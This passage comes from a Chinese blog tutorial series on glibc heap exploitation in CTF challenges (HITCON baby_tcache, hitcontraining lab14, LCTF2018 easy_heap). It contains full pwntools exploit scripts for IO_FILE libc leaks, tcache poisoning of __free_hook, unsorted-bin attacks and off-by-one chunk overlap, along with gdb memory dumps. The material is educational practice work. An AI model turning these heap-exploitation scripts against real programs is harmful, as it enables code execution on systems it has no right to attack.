0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，<br>后面接下来三个p64(0)覆盖</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure>

<p>最后覆盖一个低字节\x00到_IO_write_base，效果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x7f00898f0760</span><br><span class="line">0x7f00898f0760 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad1800	0x0000000000000000</span><br><span class="line">0x7f00898f0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0780 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f00898f0700	0x00007f00898f07e3</span><br><span class="line">0x7f00898f0790 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f00898f07e3	0x00007f00898f07e3</span><br><span class="line">0x7f00898f07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f00898f07e4	0x0000000000000000</span><br><span class="line">0x7f00898f07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007f00898efa00</span><br><span class="line">0x7f00898f07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7f00898f07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007f00898f18c0</span><br><span class="line">0x7f00898f07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x00007f00898f0700</span><br><span class="line">0x7f00898f0700 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007f00898f18b0</span><br><span class="line">0x7f00898f0710 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7f00898f0720 &lt;_IO_2_1_stderr_+160&gt;:	0x00007f00898ef780	0x0000000000000000</span><br><span class="line">0x7f00898f0730 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0740 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以可以泄露出libc地址了</p>
<h4 id="tcache-poisoning攻击"><a href="#tcache-poisoning攻击" class="headerlink" title="tcache poisoning攻击"></a>tcache poisoning攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">    new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    new(<span class="number">0x530</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">    new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">    info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">    print(repr(info1))</span><br><span class="line">    leak_libc = u64(info1)</span><br><span class="line">    io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br><span class="line">    new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">    one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure>


<h3 id="调试总结"><a href="#调试总结" class="headerlink" title="调试总结"></a>调试总结</h3><p>这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用 </p>
<h4 id="查看内存部分"><a href="#查看内存部分" class="headerlink" title="查看内存部分"></a>查看内存部分</h4><p>想gdb调试查看这部分内存的话<br>new(0x3e, p64(0xfbad1800)+ p64(0)*3 + ‘\x00’)，<br>不要在之后下断，之后查看的话看不到<br>可以在这句话之前下断</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b malloc</span><br><span class="line">finish</span><br><span class="line">n</span><br></pre></td></tr></table></figure>
<p>n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout</p>
<h4 id="gdb附加技巧"><a href="#gdb附加技巧" class="headerlink" title="gdb附加技巧"></a>gdb附加技巧</h4><p>这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口</p>
<h4 id="计算技巧"><a href="#计算技巧" class="headerlink" title="计算技巧"></a>计算技巧</h4><p>以前我经常用python计算offset，现在都是用gdb命令p  addr1-addr2</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>IO_FILE攻击还是nb,能利用基本函数泄露出libc</li>
<li>自己构造起overlap起来还是有点吃力，以后要多练习这部分内容</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a><br><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a><br><a href="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/" target="_blank" rel="noopener">2018-hitcon-baby-tcache_writeup</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程7</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程7"><a href="#pwn堆入门系列教程7" class="headerlink" title="pwn堆入门系列教程7"></a>pwn堆入门系列教程7</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a></p><p>先学习 Unsorted Bin Attack，这部分由于ctf-wiki题目较少，所以只练习了一道题<br>Large bin也没有题目，到时候遇到在进行学习</p><a id="more"></a>

<h2 id="hitcontraining-lab14"><a href="#hitcontraining-lab14" class="headerlink" title="hitcontraining_lab14"></a>hitcontraining_lab14</h2><p>这个题过程也比较简单，自己复现下就好</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>因为现在都是tcache了，所以复现起来还是得拿老版本libc测试</p>
<p>这里可以看出bk已经被修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x9ce0d0-0xd0</span><br><span class="line">0x9ce000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9ce010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce030:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x9ce040:	0x0000000a61646164	0x00000000006020b0</span><br><span class="line">0x9ce050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0c0:	0x0000000000000090	0x0000000000000031</span><br><span class="line">0x9ce0d0:	0x0000000a33333333	0x0000000000000000</span><br><span class="line">0x9ce0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0f0:	0x0000000000000000	0x0000000000020f11</span><br><span class="line">0x9ce100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>这里可以看到magic被修改了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x00000000006020b0+0x10</span><br><span class="line">0x6020c0 &lt;magic&gt;:	0x00007ff41afe4b78	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray&gt;:	0x00000000009ce010	0x00000000009ce040</span><br><span class="line">0x6020f0 &lt;heaparray+16&gt;:	0x00000000009ce0d0	0x0000000000000000</span><br><span class="line">0x602100 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>拿到flag了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    <span class="string">'flag&#123;unsorted_bin_attack&#125;\n'</span></span><br><span class="line">flag&#123;unsorted_bin_attack&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'magicheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'magicheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"3333"</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    magic = <span class="number">0x00000000006020C0</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"4869"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<p>unsortbin attack通常用于修改循环次数以及global_max_fast从而任意大小chunk可以fastbin attack</p>
<p>然后开始学习tcache</p>
<h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p>我感觉这道题质量挺高的，对于我这个新手来说，他用了挺多内存分配的知识，让我好好补了一波，这道题功能分析以及漏洞点分析请看ctf-wiki tcache篇</p>
<p>我直接讲解漏洞利用过程</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这道题麻烦就麻烦在没法直接溢出覆盖pre_size，所以要巧妙的构造pre_size，最终在overlap，后面的就是常规操作了</p>
<p>具体过程是跟ctf-wiki一样<br>具体过程：</p>
<ol>
<li>将 A -&gt; B -&gt; C 三块 unsorted bin chunk 依次进行释放</li>
<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li>
<li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li>
<li>利用 unsorted bin 切分，分配出 A</li>
<li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li>
<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li>
<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： A (free) -&gt; B (allocated) -&gt; C (free)，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
<li>tips: 但是在这个过程中需要注意 tcache 的影响。</li>
</ol>
<h4 id="堆初始化操作部分"><a href="#堆初始化操作部分" class="headerlink" title="堆初始化操作部分"></a>堆初始化操作部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<h4 id="堆块重新排列"><a href="#堆块重新排列" class="headerlink" title="堆块重新排列"></a>堆块重新排列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># tcache-0</span></span><br><span class="line"><span class="comment"># tcache-1</span></span><br><span class="line"><span class="comment"># tcache-2</span></span><br><span class="line"><span class="comment"># tcache-3</span></span><br><span class="line"><span class="comment"># tcache-4</span></span><br><span class="line"><span class="comment"># tcache-5</span></span><br><span class="line"><span class="comment"># unsorted - 6</span></span><br><span class="line"><span class="comment"># unsorted - 7</span></span><br><span class="line"><span class="comment"># unsorted - 8</span></span><br><span class="line"><span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-1</span></span><br><span class="line"><span class="comment"># chunk - 7</span></span><br><span class="line"><span class="comment"># chunk - 8</span></span><br><span class="line"><span class="comment"># chunk - 9</span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br></pre></td></tr></table></figure>

<h4 id="off-by-one覆盖造成overlap"><a href="#off-by-one覆盖造成overlap" class="headerlink" title="off-by-one覆盖造成overlap"></a>off-by-one覆盖造成overlap</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，off-by-one这里要覆盖到inuse的话，是得申请0xf8大小，malloc(0xf8)后，</p>
<ol>
<li>它会重用下个堆快的pre_size作为数据块</li>
<li>所以我们off-by-one才能覆盖到insue位<br>他会在ptr[0xf8]=0;这里就将size处的insue变成0<br>然后此时tcache还没满，所以free(6)让tcache填满后，才能用触发unsortbin合并</li>
</ol>
